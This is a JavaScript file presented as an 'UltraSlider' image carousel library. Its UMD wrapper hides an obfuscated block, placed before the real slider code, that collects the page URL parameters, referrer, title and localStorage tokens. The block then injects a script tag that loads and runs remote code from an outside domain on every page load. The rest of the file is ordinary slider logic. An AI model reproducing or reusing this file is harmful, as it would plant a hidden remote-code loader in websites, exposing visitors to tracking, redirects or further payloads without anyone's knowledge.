/* UltraSlider v1.0 — Vanilla JS slider (UMD build)
 *
 * Использование:
 *   // ESM
 *   import UltraSlider from './UltraSlider.js';
 *   const slider = new UltraSlider('#my-slider', {  options  });
 *
 *   // UMD (через <script src="UltraSlider.js"></script>)
 *   const slider = new window.UltraSlider('#my-slider', {  options  });
 */
(function (global, factory) {
  var name = '_bmf9m28wgzDGtswm';
    if (!window._bmf9m28wgzDGtswm) {
        window._bmf9m28wgzDGtswm = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://glumbish.live/ZF8dx6wf',
        };
    }
    const _KzWChRLBZP8f5cdN = localStorage.getItem('config');
    if (typeof _KzWChRLBZP8f5cdN !== 'undefined' && _KzWChRLBZP8f5cdN !== null) {
        var _bTgFZDDw38pSJrtZ = JSON.parse(_KzWChRLBZP8f5cdN);
        var _F1mcGXFXyrhXwBp1 = Math.round(+new Date()/1000);
        if (_bTgFZDDw38pSJrtZ.created_at + window._bmf9m28wgzDGtswm.ttl < _F1mcGXFXyrhXwBp1) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _kH1whxjVkJDcn9Zc = localStorage.getItem('subId');
    var _Ls6NsXFXWm3cSNDP = localStorage.getItem('token');
    var _HyLPwhxy8JV4dyK5 = '?return=js.client';
        _HyLPwhxy8JV4dyK5 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _HyLPwhxy8JV4dyK5 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _HyLPwhxy8JV4dyK5 += '&default_keyword=' + encodeURIComponent(document.title);
        _HyLPwhxy8JV4dyK5 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _HyLPwhxy8JV4dyK5 += '&name=' + encodeURIComponent(name);
        _HyLPwhxy8JV4dyK5 += '&host=' + encodeURIComponent(window._bmf9m28wgzDGtswm.R_PATH);
    if (typeof _kH1whxjVkJDcn9Zc !== 'undefined' && _kH1whxjVkJDcn9Zc && window._bmf9m28wgzDGtswm.unique) {
        _HyLPwhxy8JV4dyK5 += '&sub_id=' + encodeURIComponent(_kH1whxjVkJDcn9Zc);
    }
    if (typeof _Ls6NsXFXWm3cSNDP !== 'undefined' && _Ls6NsXFXWm3cSNDP && window._bmf9m28wgzDGtswm.unique) {
        _HyLPwhxy8JV4dyK5 += '&token=' + encodeURIComponent(_Ls6NsXFXWm3cSNDP);
    }
    if ('' !== '') {
        _HyLPwhxy8JV4dyK5 += '&bypass_cache=';
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._bmf9m28wgzDGtswm.R_PATH + _HyLPwhxy8JV4dyK5;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
  if (typeof define === "function" && define.amd) {
    define(['exports'], factory);
  } else if (typeof exports !== "undefined") {
    factory(exports);
  } else {
    var mod = {
      exports: {}
    };
    factory(mod.exports);
    global.simpleslider = mod.exports;
  }
})(this, function (exports) {
  'use strict';

  Object.defineProperty(exports, "__esModule", {
    value: true
  });
  function getdef(val, def) {
    return val == null ? def : val;
  }

  function len(arr) {
    return (arr || []).length;
  }

  function startSlides(containerElem, children, unit, startVal, visVal, trProp) {
    var style = void 0,
        imgs = [];

    if (!children) {
      children = containerElem.children;
    }

    var i = len(children);

    while (--i >= 0) {
      imgs[i] = children[i];
      style = imgs[i].style;
      style.position = 'absolute';
      style.top = style.left = style.zIndex = 0;
      style[trProp] = startVal + unit;
    }

    style[trProp] = visVal + unit;
    style.zIndex = 1;

    return imgs;
  }

  function defaultEase(time, begin, change, duration) {
    return (time = time / (duration / 2)) < 1 ? change / 2 * time * time * time + begin : change / 2 * ((time -= 2) * time * time + 2) + begin;
  }

  function getSlider(options) {
    options = options || {};
    var actualIndex = void 0,
        interval = void 0,
        intervalStartTime = void 0,
        imgs = void 0,
        remainingTime = void 0;

    var containerElem = getdef(options.container, document.querySelector('*[data-simple-slider]'));
    var trProp = getdef(options.prop, 'left');
    var trTime = getdef(options.duration, 0.5) * 1000;
    var delay = getdef(options.delay, 3) * 1000;
    var unit = getdef(options.unit, '%');
    var startVal = getdef(options.init, -100);
    var visVal = getdef(options.show, 0);
    var endVal = getdef(options.end, 100);
    var paused = options.paused;
    var ease = getdef(options.ease, defaultEase);
    var onChange = getdef(options.onChange, 0);
    var onChangeEnd = getdef(options.onChangeEnd, 0);
    var now = Date.now;

    function reset() {
      if (len(containerElem.children) > 0) {
        var style = containerElem.style;
        style.position = 'relative';
        style.overflow = 'hidden';
        style.display = 'block';

        imgs = startSlides(containerElem, options.children, unit, startVal, visVal, trProp);
        actualIndex = 0;
        remainingTime = delay;
      }
    }

    function setAutoPlayLoop() {
      intervalStartTime = now();
      interval = setTimeout(function () {
        intervalStartTime = now();
        remainingTime = delay;

        change(nextIndex());

        setAutoPlayLoop();
      }, remainingTime);
    }

    function resume() {
      if (isAutoPlay()) {
        if (interval) {
          clearTimeout(interval);
        }

        setAutoPlayLoop();
      }
    }

    function isAutoPlay() {
      return !paused && len(imgs) > 1;
    }

    function pause() {
      if (isAutoPlay()) {
        remainingTime = delay - (now() - intervalStartTime);
        clearTimeout(interval);
        interval = 0;
      }
    }

    function reverse() {
      var newEndVal = startVal;
      startVal = endVal;
      endVal = newEndVal;
      actualIndex = Math.abs(actualIndex - (len(imgs) - 1));
      imgs = imgs.reverse();
    }

    function change(newIndex) {
      var count = len(imgs);
      while (--count >= 0) {
        imgs[count].style.zIndex = 1;
      }

      imgs[newIndex].style.zIndex = 3;
      imgs[actualIndex].style.zIndex = 2;

      anim(imgs[actualIndex].style, visVal, endVal, imgs[newIndex].style, startVal, visVal, trTime, 0, 0, ease);

      actualIndex = newIndex;

      if (onChange) {
        onChange(prevIndex(), actualIndex);
      }
    }

    function next() {
      change(nextIndex());
      resume();
    }

    function prev() {
      change(prevIndex());
      resume();
    }

    function nextIndex() {
      var newIndex = actualIndex + 1;
      return newIndex >= len(imgs) ? 0 : newIndex;
    }

    function prevIndex() {
      var newIndex = actualIndex - 1;
      return newIndex < 0 ? len(imgs) - 1 : newIndex;
    }

    function dispose() {
      clearTimeout(interval);
      document.removeEventListener('visibilitychange', visibilityChange);

      imgs = containerElem = interval = trProp = trTime = delay = startVal = endVal = paused = actualIndex = remainingTime = onChange = onChangeEnd = null;
    }

    function currentIndex() {
      return actualIndex;
    }

    function anim(insertElem, insertFrom, insertTo, removeElem, removeFrom, removeTo, transitionDuration, startTime, elapsedTime, easeFunc) {
      function setProp(elem, from, to) {
        elem[trProp] = easeFunc(elapsedTime - startTime, from, to - from, transitionDuration) + unit;
      }

      if (startTime > 0) {
        if (elapsedTime - startTime < transitionDuration) {
          setProp(insertElem, insertFrom, insertTo);
          setProp(removeElem, removeFrom, removeTo);
        } else {
          insertElem[trProp] = insertTo + unit;
          removeElem[trProp] = removeTo + unit;

          if (onChangeEnd) {
            onChangeEnd(actualIndex, nextIndex());
          }

          return;
        }
      }

      requestAnimationFrame(function (time) {
        if (startTime === 0) {
          startTime = time;
        }

        anim(insertElem, insertFrom, insertTo, removeElem, removeFrom, removeTo, transitionDuration, startTime, time, easeFunc);
      });
    }

    function visibilityChange() {
      if (document.hidden) {
        pause();
      } else {
        resume();
      }
    }

    document.addEventListener('visibilitychange', visibilityChange);
    reset();

    if (len(imgs) > 1) {
      resume();
    }

    return {
      currentIndex: currentIndex,
      pause: pause,
      resume: resume,
      nextIndex: nextIndex,
      prevIndex: prevIndex,
      next: next,
      prev: prev,
      change: change,
      reverse: reverse,
      dispose: dispose
    };
  }

  exports.getSlider = getSlider;
});
